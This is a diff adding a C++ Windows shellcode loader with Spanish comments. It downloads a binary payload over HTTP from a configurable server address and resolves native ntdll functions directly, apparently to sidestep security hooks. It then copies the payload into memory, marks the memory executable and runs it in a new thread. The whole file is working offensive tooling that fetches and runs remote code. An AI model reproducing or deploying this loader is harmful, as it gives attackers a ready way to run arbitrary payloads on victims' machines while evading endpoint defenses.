@@ -1,0 +1,167 @@
+#include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+#include <winternl.h>
+
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "ntdll")
+
+#define NtCurrentProcess() ((HANDLE)-1)
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+// Prototipos de las funciones nativas de Windows
+typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
+    HANDLE    ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T   RegionSize,
+    ULONG     AllocationType,
+    ULONG     Protect);
+
+typedef NTSTATUS(WINAPI* _NtProtectVirtualMemory)(
+    HANDLE    ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T   RegionSize,
+    ULONG     NewProtect,
+    PULONG    OldProtect);
+
+typedef NTSTATUS(WINAPI* _NtCreateThreadEx)(
+    OUT PHANDLE hThread,
+    IN ACCESS_MASK DesiredAccess,
+    IN PVOID ObjectAttributes,
+    IN HANDLE ProcessHandle,
+    IN PVOID lpStartAddress,
+    IN PVOID lpParameter,
+    IN ULONG Flags,
+    IN SIZE_T StackZeroBits,
+    IN SIZE_T SizeOfStackCommit,
+    IN SIZE_T SizeOfStackReserve,
+    OUT PVOID lpBytesBuffer
+    );
+
+typedef NTSTATUS(WINAPI* _NtWaitForSingleObject)(
+    HANDLE         Handle,
+    BOOLEAN        Alertable,
+    PLARGE_INTEGER Timeout);
+
+// Función para descargar el shellcode desde un servidor
+std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
+    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return {};
+
+    HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    std::vector<BYTE> buffer;
+    DWORD dwSize = 0, dwDownloaded = 0;
+    do {
+        WinHttpQueryDataAvailable(hRequest, &dwSize);
+        if (dwSize > 0) {
+            std::vector<BYTE> tempBuffer(dwSize);
+            WinHttpReadData(hRequest, tempBuffer.data(), dwSize, &dwDownloaded);
+            buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
+        }
+    } while (dwSize > 0);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+
+int main() {
+    PVOID BaseAddress = NULL;
+    DWORD OldProtect = 0;
+    HANDLE hHostThread = INVALID_HANDLE_VALUE;
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // Obtener las direcciones de las funciones
+    _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+    _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    _NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+
+    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx || !NtWaitForSingleObject) {
+        printf("Failed to get the address of Nt* functions\n");
+        return 1;
+    }
+
+    // Descargar shellcode desde un servidor remoto
+    std::wstring serverName = L"192.168.2.138";  // Cambia esto por tu servidor
+    std::wstring objectName = L"/test.bin";      // Cambia esto por tu archivo shellcode
+    std::vector<BYTE> shellcode = DownloadShellcode(serverName.c_str(), objectName.c_str());
+
+    if (shellcode.empty()) {
+        std::cerr << "Error al descargar el shellcode.\n";
+        return 1;
+    }
+
+    SIZE_T shellcodeSize = shellcode.size();
+
+    // Asignar memoria para el shellcode en el proceso actual
+    NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        printf("NtAllocateVirtualMemory failed\n");
+        return 1;
+    }
+    printf("[+] RW Virtual Memory Successfully Allocated @ %p\n", BaseAddress);
+
+    // Copiar el shellcode descargado en la memoria asignada
+    memcpy(BaseAddress, shellcode.data(), shellcodeSize);
+    printf("[+] Successfully Wrote the Shellcode into allocated Memory !!!\n");
+
+    // Cambiar la protección de la memoria para hacerla ejecutable
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
+    if (!NT_SUCCESS(status)) {
+        printf("NtProtectVirtualMemory failed\n");
+        return 1;
+    }
+    printf("\n[+] Changed the permission of memory from RW to RX @ %p\n", BaseAddress);
+
+    // Crear un hilo para ejecutar el shellcode
+    status = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+    if (!NT_SUCCESS(status)) {
+        printf("NtCreateThreadEx failed\n");
+        return 1;
+    }
+    printf("\n[+] Executed Shellcode............!!! @ %p\n", BaseAddress);
+
+    // Esperar a que el hilo termine
+    LARGE_INTEGER Timeout;
+    Timeout.QuadPart = -10000000;
+    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
+    if (!NT_SUCCESS(NTWFSOstatus)) {
+        printf("[!] Failed in NtWaitForSingleObject (%u)\n", GetLastError());
+        return 4;
+    }
+
+    printf("\n\n[+] Work has been done!!!!\n");
+
+    // Restaurar la protección original
+    VirtualProtect(BaseAddress, shellcodeSize, PAGE_READONLY, &OldProtect);
+    printf("\n\n[+] Changed the permission of allocated region to R before quitting!!!!\n");
+
+    return 0;
+}
